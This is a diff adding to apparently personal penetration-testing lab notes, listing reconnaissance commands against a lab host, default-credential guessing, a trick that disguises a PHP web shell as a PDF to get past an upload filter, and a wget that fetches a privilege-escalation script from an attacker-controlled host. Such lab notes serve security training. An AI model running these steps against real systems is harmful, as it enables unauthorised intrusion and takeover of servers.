@@ -218,4 +218,36 @@ nmap -sT -A -p 80,8090 192.168.248.225
 # open ports: 21, 80, 8090
 
 # enumerate ftp
+nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.248.225
+
+# enumerate webserver port 80
+whatweb 192.168.248.225
+nikto -host 192.168.248.225 -port 80
+sudo nmap -sV -p 80 --script "vuln" 192.168.248.225
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.248.225
+
+# enumerate webserver port 8090
+whatweb 192.168.248.225:8090
+nikto -host 192.168.248.225 -port 8090
+sudo nmap -sV -p 8090 --script "vuln" 192.168.248.225
+gobuster dir -u http://192.168.248.225:8090 -w /usr/share/wordlists/dirb/big.txt
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.248.225:8090
+# find http://192.168.248.225:8090/backend/default/uploads/ but 403
+gobuster dir -u http://192.168.248.225:8090 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf
+
+# try php files always if we can't find anything. in this case we found some directories but no files inside the directories
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt --url http://192.168.248.225:8090/backend/default
+
+# on index.php, log in with admin:admin
+# we need to test a bunch of default creds such as admin:password, or admin:admin
+
+# can only upload a file that looks like a pdf so we need to add this to the top of our php shell file, but use the .php extension
+%PDF-1.5
+# go here to catch shell
+http://192.168.248.225:8090/backend/default/uploads/shell.php
+```
+
+.224 privesc
+```
+wget http://192.168.45.160/linpeas.sh -O linpeas.sh
 ```
